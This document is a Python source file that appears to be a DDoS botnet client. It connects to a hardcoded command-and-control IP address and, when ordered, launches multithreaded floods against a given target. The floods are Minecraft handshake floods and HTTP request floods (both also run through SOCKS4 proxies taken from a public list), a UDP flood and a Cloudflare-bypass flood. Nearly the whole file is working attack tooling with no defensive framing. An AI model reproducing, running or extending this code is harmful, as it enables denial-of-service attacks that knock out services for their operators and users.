from urllib.parse import urlparse
import socket
import cfscrape
import struct
import string
import requests
import random
import threading
import time
import json
import traceback
import socks


BOTS_SERVER_ADDR = ("149.56.10.115", 13484)
CAN_UDP = False


def send(sock, data: dict):
    jsondata = json.dumps(data).encode()
    sock.send(varint_pack(len(jsondata)) + jsondata)


def read(sock) -> dict:
    return json.loads(sock.recv(varint_read(sock)).decode())


def varint_pack(d):
    o = b''
    while True:
        b = d & 0x7F
        d >>= 7
        o += struct.pack("B", b | (0x80 if d > 0 else 0))
        if d == 0:
            break
    return o


def read_one(socket):
    """Reads 1 byte from socket"""
    c = socket.recv(1)
    if c == b'':
        raise EOFError("Unexpected EOF while reading bytes")
    return ord(c)


def varint_read(socket):
    """Read a varint from socket"""
    shift = 0
    result = 0
    while True:
        i = read_one(socket)
        result |= (i & 0x7f) << shift
        shift += 7
        if not (i & 0x80):
            break

    return result


def unsigned_short_pack(val: int):
    return struct.pack("!H", val)


def data_pack(data):
    return varint_pack(len(data)) + data


def string_pack(string):
    return data_pack(string.encode())


def handshake_packet(host: str, port: int, prot: int, next_state: int) -> bytes:
    packet_id = b"\x00"
    data = varint_pack(prot) + string_pack(host) + unsigned_short_pack(port) + varint_pack(next_state)
    return data_pack(packet_id + data)


def join_game_packet(usr: str) -> bytes:
    packet_id = b"\x00"  # packet id in varint
    data = string_pack(usr)
    return data_pack(packet_id + data)


def randstr(size: int):
    return "".join(random.choice(list(string.ascii_letters + string.digits)) for _ in range(size))


def minecraft(addr, proto, until):
    while until > time.time():
        sock = socket.socket()
        sock.connect((addr.split(":")[0], int(addr.split(":")[1])))
        sock.send(handshake_packet(addr.split(":")[0], int(addr.split(":")[1]), int(proto), 2))
        sock.close()


def minecraft_proxy(addr, proto, proxies, until):
    while until > time.time():
        sock = socks.socksocket()
        proxy = random.choice(proxies).split(":")
        sock.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
        sock.connect((addr.split(":")[0], int(addr.split(":")[1])))
        sock.send(handshake_packet(addr.split(":")[0], int(addr.split(":")[1]), int(proto), 2))
        sock.close()


def http_pps(url, until):
    url = urlparse(url)
    packet = f"GET {'/' if url.path is None else url.path} HTTP/1.1\r\nConnection: keep-alive\r\nHost:{url.netloc}\r\n\r\n" * 100
    while until > time.time():
        sock = socket.socket()
        sock.connect((url.hostname, int(url.port)))
        sock.send(packet.encode())
        sock.close()


def http_pps_proxy(url, proxies, until):
    url = urlparse(url)
    packet = f"GET {'/' if url.path is None else url.path} HTTP/1.1\r\nConnection: keep-alive\r\nHost:{url.netloc}\r\n\r\n" * 100
    while until > time.time():
        sock = socks.socksocket()
        proxy = random.choice(proxies).split(":")
        sock.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
        sock.connect((url.hostname, int(url.port)))
        while True:
            try:
                sock.send(packet.encode())
            except Exception:
                break
        sock.close()


def udp(addr, until):
    while until > time.time():
        sock = socket.socket()
        sock.sendto(random._urandom(60000), (addr.split(":")[0], int(addr.split(":")[1])))


def cloudflare(url, until):
    scraper = cfscrape.create_scraper()
    while until > time.time():
        scraper.get(url)


def run_bot():
    while True:
        sock = socket.socket()
        try:
            sock.connect(BOTS_SERVER_ADDR)
        except Exception as e:
            print(f"Conn failed: {e}\nRetrying...")
            continue
        print("Connected!")
        try:
            while True:
                data = read(sock)
                print(f"Data: {data}")
                if data["packet"] == "keep_alive":
                    send(sock, {"packet": "keep_alive", "data": {
                        "keep_alive_id": data["data"]["keep_alive_id"]
                    }})
                elif data["packet"] == "runAttack":
                    method = data["data"]["method"]
                    addr = data["data"]["target_addr"]
                    seconds = int(data["data"]["seconds"])
                    threads = int(data["data"]["threads"])
                    if method == "udp":
                        if CAN_UDP:
                            print("Can udp attack")
                            for _ in range(threads):
                                threading.Thread(target=udp, args=(addr, time.time() + seconds)).start()
                    elif method == "minecraft":
                        for _ in range(threads):
                            threading.Thread(target=minecraft, args=(addr, int(data["data"]["other"][0]), time.time() + seconds)).start()
                    elif method == "minecraftproxy":
                        proxies = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt").text.splitlines()[2:]
                        for _ in range(threads):
                            threading.Thread(target=minecraft_proxy, args=(addr, int(data["data"]["other"][0]), proxies, time.time() + seconds)).start()
                    elif method == "http-pps":
                        for _ in range(threads):
                            threading.Thread(target=http_pps, args=(addr, time.time() + seconds)).start()
                    elif method == "http-ppsproxy":
                        proxies = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt").text.splitlines()[2:]
                        for _ in range(threads):
                            threading.Thread(target=http_pps_proxy, args=(addr, proxies, time.time() + seconds)).start()
                    elif method == "cloudflare":
                        for _ in range(threads):
                            threading.Thread(target=cloudflare, args=(addr, time.time() + seconds)).start()
        except Exception:
            print(f"Exception: {traceback.format_exc()}\nReconnecting...")
            continue


run_bot()
